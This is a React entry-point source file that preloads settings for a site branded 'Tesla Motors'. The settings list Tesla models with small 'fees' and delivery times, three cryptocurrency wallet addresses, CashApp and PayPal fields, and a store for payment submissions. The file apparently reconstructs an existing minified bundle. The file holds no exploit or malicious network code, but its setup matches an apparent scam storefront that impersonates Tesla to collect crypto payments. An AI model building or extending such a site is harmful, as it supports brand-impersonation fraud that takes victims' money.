import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App.jsx'
import './index.css'

// --- PRELOAD LOCALSTORAGE (Prevents app from breaking on first load) ---
const initLocalStorage = () => {
  // 1. Default Branding & Car Data (Matches the original minified bundle)
  const DEFAULT_CARS = [
    { name: "Tesla Model 3", tier: "Performance Sedan", fee: "$299", delivery: "7–10 Business Days", img: "/images/tesla-model-3.jpg" },
    { name: "Tesla Model Y", tier: "Premium SUV", fee: "$349", delivery: "5–7 Business Days", img: "/images/tesla-model-y.jpg" },
    { name: "Tesla Model S", tier: "Luxury Flagship", fee: "$399", delivery: "3–5 Business Days", img: "/images/tesla-model-s.jpg" },
    { name: "Tesla Model X", tier: "Luxury SUV", fee: "$249", delivery: "10–14 Business Days", img: "/images/tesla-model-x.jpg" },
    { name: "Tesla Cybertruck", tier: "Electric Truck", fee: "$379", delivery: "5–8 Business Days", img: "/images/tesla-cybertruck.jpg" },
    { name: "Tesla Roadster", tier: "Ultra Performance", fee: "$499", delivery: "3–5 Business Days", img: "/images/tesla-roadster.jpg" },
    { name: "Tesla Model 3 SR", tier: "Standard Range", fee: "$199", delivery: "10–14 Business Days", img: "/images/tesla-model-3.jpg" },
    { name: "Tesla Model Y LR", tier: "Long Range SUV", fee: "$329", delivery: "7–10 Business Days", img: "/images/tesla-model-y.jpg" },
    { name: "Tesla Model S Plaid", tier: "Performance Sedan", fee: "$359", delivery: "5–7 Business Days", img: "/images/tesla-model-s.jpg" }
  ];

  const DEFAULT_WALLETS = [
    { label: "Bitcoin (BTC)", address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", logo: "" },
    { label: "Ethereum (ETH)", address: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e", logo: "" },
    { label: "USDT (TRC20)", address: "TQxT9zfE58rWbq8zKZ7J9fBmT24PbE5xLm", logo: "" }
  ];

  const DEFAULT_BRANDING = {
    site_name: "Tesla Motors",
    logo_url: "/images/tesla-logo.png",
    hero_image_url: "/images/tesla-model-s.jpg",
    cashapp_tag: "",
    paypal_tag: ""
  };

  // 2. If settings are missing, inject them
  if (!localStorage.getItem("tesla_site_settings")) {
    const settings = {
      id: "init_" + Date.now(),
      ...DEFAULT_BRANDING,
      car_count: String(DEFAULT_CARS.length),
      pm_count: String(DEFAULT_WALLETS.length)
    };
    DEFAULT_CARS.forEach((car, i) => {
      settings[`car_${i+1}_name`] = car.name;
      settings[`car_${i+1}_tier`] = car.tier;
      settings[`car_${i+1}_fee`] = car.fee;
      settings[`car_${i+1}_delivery`] = car.delivery;
      settings[`car_${i+1}_img`] = car.img;
    });
    DEFAULT_WALLETS.forEach((w, i) => {
      settings[`pm_${i+1}_label`] = w.label;
      settings[`pm_${i+1}_address`] = w.address;
      settings[`pm_${i+1}_logo`] = w.logo;
    });
    localStorage.setItem("tesla_site_settings", JSON.stringify([settings]));
  }

  // 3. If submissions array is missing, inject an empty one
  if (!localStorage.getItem("tesla_payment_submissions")) {
    localStorage.setItem("tesla_payment_submissions", JSON.stringify([]));
  }
};

// Run the initialization before rendering
initLocalStorage();

// --- RENDER APP ---
ReactDOM.createRoot(document.getElementById('root')).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>,
)
